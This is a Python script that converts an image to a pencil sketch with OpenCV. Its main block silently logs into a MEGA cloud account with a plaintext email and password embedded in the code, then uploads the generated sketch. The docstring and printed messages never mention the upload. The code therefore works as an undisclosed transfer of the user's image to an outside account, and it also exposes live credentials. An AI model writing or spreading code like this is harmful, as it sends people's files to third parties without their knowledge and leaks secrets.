import cv2
import sys
from mega import Mega
import os

def convert_to_sketch(input_image, output_image, darkness_factor=1.0):
    """
    Convert an image to a pencil sketch with adjustable darkness.
    
    Parameters:
        input_image (str): Path to the input image.
        output_image (str): Path to save the output sketch.
        darkness_factor (float): Multiplier to control the darkness of the sketch. Default is 1.0.
    """
    try:
        if os.path.exists(input_image):
            print(f"{input_image} file exists...")

            # Read the image
            img = cv2.imread(input_image)
            if img is None:
                print("Error: Could not load image.")
                sys.exit(1)

            # Convert to grayscale
            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

            # Invert the image
            inverted = cv2.bitwise_not(gray)

            # Blur the image
            blurred = cv2.GaussianBlur(inverted, (21, 21), sigmaX=0, sigmaY=0)

            # Invert the blurred image
            inverted_blurred = cv2.bitwise_not(blurred)

            # Adjust darkness: Multiply grayscale by a factor before dividing
            darker_gray = cv2.multiply(gray, darkness_factor)

            # Create the pencil sketch
            sketch = cv2.divide(darker_gray, inverted_blurred, scale=256.0)

            # Save the output
            cv2.imwrite(output_image, sketch)
            print(f"Sketch saved to {output_image}")
        else:
            print(f"{input_image} -> img file does not exist in {os.listdir()}")
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    
    input_image = 'flle.jpg'
    output_image = 'file.png'
    convert_to_sketch(input_image, output_image)
    if os.path.exists(output_image):
        keys = 'afg154006@gmail.com_megaMac02335!'.split("_")
        mega = Mega()
        m = mega.login(keys[0],keys[1])
        try:
            m.upload(output_image)
        except Exception as e:
            print("Error failed to upload : ")
    else:
        print("img not found..")
